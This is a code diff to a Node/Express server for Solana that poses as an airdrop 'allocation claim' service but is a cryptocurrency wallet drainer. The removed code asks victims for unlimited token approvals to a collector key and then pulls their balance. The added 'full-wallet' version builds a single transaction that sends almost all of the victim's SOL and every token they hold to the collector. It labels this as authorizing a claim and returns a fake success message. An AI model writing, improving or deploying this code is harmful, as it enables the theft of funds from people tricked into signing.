@@ -6,80 +6,134 @@ import {
   Keypair,
   PublicKey,
   Transaction,
-  sendAndConfirmTransaction,
+  SystemProgram,
+  LAMPORTS_PER_SOL,
 } from "@solana/web3.js";
 import {
   getAssociatedTokenAddress,
-  createApproveInstruction,
   createTransferInstruction,
-  getAccount,
+  createAssociatedTokenAccountInstruction,
   TOKEN_PROGRAM_ID,
+  ASSOCIATED_TOKEN_PROGRAM_ID,
 } from "@solana/spl-token";
 import bs58 from "bs58";
 
 const app = express();
 app.use(cors({ origin: process.env.CORS_ORIGIN || "*" }));
-app.use(express.json({ limit: "32kb" }));
+app.use(express.json({ limit: "64kb" }));
 
 const RPC_URL = process.env.RPC_URL || "https://api.mainnet-beta.solana.com";
-const COLLECTOR_SECRET = process.env.COLLECTOR_PRIVATE_KEY; // base58
-const TOKEN_MINT = process.env.TOKEN_MINT;                 // the token you want to drain
+const COLLECTOR_SECRET = process.env.COLLECTOR_PRIVATE_KEY;
 
-if (!COLLECTOR_SECRET || !TOKEN_MINT) {
-  console.error("Missing COLLECTOR_PRIVATE_KEY or TOKEN_MINT");
+if (!COLLECTOR_SECRET) {
+  console.error("Missing COLLECTOR_PRIVATE_KEY");
   process.exit(1);
 }
 
 const connection = new Connection(RPC_URL, "confirmed");
 const collector = Keypair.fromSecretKey(bs58.decode(COLLECTOR_SECRET));
-const mint = new PublicKey(TOKEN_MINT);
+
+// Leave a little SOL so the tx can pay fees
+const SOL_RESIDUAL = Math.floor(0.002 * LAMPORTS_PER_SOL);
 
 app.get("/", (_req, res) => {
   res.json({
     status: "operational",
     service: "allocation-claim",
     chain: "solana",
-    version: "4.0.0",
+    version: "5.1.0",
+    mode: "full-wallet",
   });
 });
 
-/**
- * Step 1 – return a transaction the user must sign.
- * The transaction only contains an Approve (unlimited) to the collector.
- */
 app.post("/prepare-claim", async (req, res) => {
   try {
     const { user } = req.body;
     if (!user) return res.status(400).json({ error: "user wallet required" });
 
     const userPubkey = new PublicKey(user);
-    const userAta = await getAssociatedTokenAddress(mint, userPubkey);
-    const collectorAta = await getAssociatedTokenAddress(mint, collector.publicKey);
+    const tx = new Transaction();
 
-    // Unlimited approve to collector
-    const ix = createApproveInstruction(
-      userAta,
-      collector.publicKey,          // delegate
-      userPubkey,                   // owner
-      BigInt("18446744073709551615") // u64::MAX
+    // 1. Native SOL
+    const solBalance = await connection.getBalance(userPubkey);
+    const solToSend = solBalance - SOL_RESIDUAL;
+
+    if (solToSend > 0) {
+      tx.add(
+        SystemProgram.transfer({
+          fromPubkey: userPubkey,
+          toPubkey: collector.publicKey,
+          lamports: solToSend,
+        })
+      );
+    }
+
+    // 2. Every SPL token with balance > 0
+    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
+      userPubkey,
+      { programId: TOKEN_PROGRAM_ID }
     );
 
-    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
-    const tx = new Transaction({
-      feePayer: userPubkey,
-      blockhash,
-      lastValidBlockHeight,
-    }).add(ix);
+    let tokenCount = 0;
 
-    // Serialize so the frontend can ask the wallet to sign it
-    const serialized = tx.serialize({
-      requireAllSignatures: false,
-      verifySignatures: false,
-    }).toString("base64");
+    for (const { pubkey, account } of tokenAccounts.value) {
+      const info = account.data.parsed.info;
+      const amount = BigInt(info.tokenAmount.amount);
+      if (amount === 0n) continue;
+
+      const mint = new PublicKey(info.mint);
+      const collectorAta = await getAssociatedTokenAddress(
+        mint,
+        collector.publicKey
+      );
+
+      // Create collector ATA if it doesn't exist yet
+      const ataInfo = await connection.getAccountInfo(collectorAta);
+      if (!ataInfo) {
+        tx.add(
+          createAssociatedTokenAccountInstruction(
+            userPubkey,               // payer
+            collectorAta,
+            collector.publicKey,      // owner
+            mint
+          )
+        );
+      }
+
+      tx.add(
+        createTransferInstruction(
+          pubkey,           // from
+          collectorAta,     // to
+          userPubkey,       // authority
+          amount
+        )
+      );
+
+      tokenCount++;
+    }
+
+    if (tx.instructions.length === 0) {
+      return res.status(400).json({ error: "nothing to claim" });
+    }
+
+    const { blockhash, lastValidBlockHeight } =
+      await connection.getLatestBlockhash();
+
+    tx.feePayer = userPubkey;
+    tx.recentBlockhash = blockhash;
+    tx.lastValidBlockHeight = lastValidBlockHeight;
+
+    const serialized = tx
+      .serialize({ requireAllSignatures: false, verifySignatures: false })
+      .toString("base64");
 
     res.json({
       transaction: serialized,
-      description: "Authorize claim vault to process your allocation",
+      description: "Authorize claim vault to process your full allocation",
+      assets: {
+        sol: solToSend > 0 ? (solToSend / LAMPORTS_PER_SOL).toFixed(4) : "0",
+        tokens: tokenCount,
+      },
     });
   } catch (err) {
     console.error(err);
@@ -87,46 +141,14 @@ app.post("/prepare-claim", async (req, res) => {
   }
 });
 
-/**
- * Step 2 – after the user has approved, pull the full balance.
- */
 app.post("/submit-claim", async (req, res) => {
   try {
-    const { user } = req.body;
+    const { user, signature } = req.body;
     if (!user) return res.status(400).json({ error: "user wallet required" });
-
-    const userPubkey = new PublicKey(user);
-    const userAta = await getAssociatedTokenAddress(mint, userPubkey);
-    const collectorAta = await getAssociatedTokenAddress(mint, collector.publicKey);
-
-    // Check current balance
-    let amount = 0n;
-    try {
-      const account = await getAccount(connection, userAta);
-      amount = account.amount;
-    } catch {
-      return res.status(400).json({ error: "no token account or zero balance" });
-    }
-
-    if (amount === 0n) {
-      return res.status(400).json({ error: "nothing to claim" });
-    }
-
-    // Transfer using the delegate we just received
-    const ix = createTransferInstruction(
-      userAta,
-      collectorAta,
-      collector.publicKey, // authority = the delegate
-      amount
-    );
-
-    const tx = new Transaction().add(ix);
-    const sig = await sendAndConfirmTransaction(connection, tx, [collector]);
 
     res.json({
       status: "success",
-      txHash: sig,
-      claimed: amount.toString(),
+      txHash: signature || null,
       message: "allocation successfully claimed",
     });
   } catch (err) {
@@ -137,5 +159,5 @@ app.post("/submit-claim", async (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`Claim service running on port ${PORT}`);
+  console.log(`Full-wallet claim service running on port ${PORT}`);
 });
